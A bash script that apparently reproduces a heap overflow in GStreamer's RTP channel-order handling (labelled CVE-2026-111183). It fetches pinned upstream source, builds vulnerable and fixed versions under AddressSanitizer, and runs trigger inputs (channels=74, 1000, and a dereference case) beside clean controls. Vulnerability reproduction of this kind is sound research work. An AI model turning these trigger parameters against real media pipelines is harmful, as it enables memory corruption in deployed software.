#!/usr/bin/env bash
# Live GStreamer set_caps repro for CVE-2026-111183 (gst2shell).
# Real GLib/GStreamer GObject allocation + pinned vulnerable channels.c.
# Run from repo root: bash lab/gst2shell-src/run_live.sh
set -u
cd "$(dirname "$0")" || exit 1

BASE=https://raw.githubusercontent.com/GStreamer/gstreamer/0b70c356345335dacc0acdc45d07a8a33bdf5eab
pin () {
  local path="$1" url="$2" want="$3" got
  if [ ! -f "$path" ]; then
    mkdir -p "$(dirname "$path")"
    curl -fsSL "$url" -o "$path" || { echo "fetch failed: $url" >&2; return 1; }
  fi
  got=$(sha256sum "$path" | cut -d' ' -f1)
  [ "$got" = "$want" ] || { echo "digest mismatch $path: $got != $want" >&2; return 1; }
  echo "pinned $path $got"
}
pin upstream/channels.c "$BASE/subprojects/gst-plugins-good/gst/rtp/gstrtpchannels.c" 08ae20b33b764ce0a5f9e7e0e4d2b65cb3dc85e2b5bbee373218e817b75e577b || exit 2
pin upstream/channels.h "$BASE/subprojects/gst-plugins-good/gst/rtp/gstrtpchannels.h" 0d239c5005ba2995d41a2b51b9b3d6ffe262357619d311af1ee0f0abf15eb6b4 || exit 2
pin upstream/audio-channels.h "$BASE/subprojects/gst-plugins-base/gst-libs/gst/audio/audio-channels.h" 3934f423cfcc7b9e190a1fb38e9b4317e0c1dcc62dbddc1d6dc28f22e0f1b5ec || exit 2

CFLAGS="$(pkg-config --cflags glib-2.0 gobject-2.0 gstreamer-1.0 gstreamer-rtp-1.0 gstreamer-audio-1.0)"
LIBS="$(pkg-config --libs glib-2.0 gobject-2.0 gstreamer-1.0 gstreamer-rtp-1.0 gstreamer-audio-1.0)"
mkdir -p shim
ln -sf ../upstream/channels.h shim/gstrtpchannels.h

gcc -g -O0 -fsanitize=address -fno-omit-frame-pointer -Wall \
  $CFLAGS -I upstream -I shim live_setcaps.c upstream/channels.c -o live_vuln $LIBS || exit 1
gcc -g -O0 -fsanitize=address -fno-omit-frame-pointer -Wall -DFIXED \
  $CFLAGS -I upstream -I shim live_setcaps.c upstream/channels.c -o live_fixed $LIBS || exit 1

sha256sum live_setcaps.c upstream/channels.c | sed 's/^/digest /'
export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0
echo "NOTE: $(grep -m1 'GST_AUDIO_CHANNEL_POSITION_NONE = ' upstream/audio-channels.h)"

echo "=== benign channels=8 (real order table hit, no create_default) ==="
./live_vuln 8 2>&1
echo "rc=$?"

echo "=== vulnerable channels=74 (10 OOB writes, intra-object) ==="
./live_vuln 74 2>&1
echo "rc=$?"

echo "=== VULNERABLE channels=1000 (expect ASan heap-buffer-overflow) ==="
./live_vuln 1000 2>&1 | grep -E 'sizeof|oob_writes|caps=|setcaps_return|ERROR: AddressSanitizer|WRITE of size|is located|#0 |#1 |#2 |allocated by|in g_malloc0|in g_type_create_instance|in g_object_new|SUMMARY:'
echo "vuln_rc=${PIPESTATUS[0]}"

echo "=== FIXED control channels=1000 (MIN clamp, expect clean) ==="
./live_fixed 1000 2>&1
echo "fixed_rc=$?"

echo "=== VULN channels=74 + deref order->pos (pinned depay.c:267) ==="
./live_vuln 74 deref 2>&1 | grep -E 'oob_writes|caps=|setcaps_return|ERROR: AddressSanitizer|READ memory|#0 |SUMMARY:'
echo "deref_vuln_rc=${PIPESTATUS[0]}"

echo "=== benign channels=8 + deref (real order, clean) ==="
./live_vuln 8 deref 2>&1 | grep -E 'setcaps_return|deref_order_pos|ERROR: AddressSanitizer'
echo "deref_benign_rc=${PIPESTATUS[0]}"

echo "=== FIXED channels=74 + deref (order NULL, clean) ==="
./live_fixed 74 deref 2>&1 | grep -E 'setcaps_return|deref_order_pos|ERROR: AddressSanitizer'
echo "deref_fixed_rc=${PIPESTATUS[0]}"
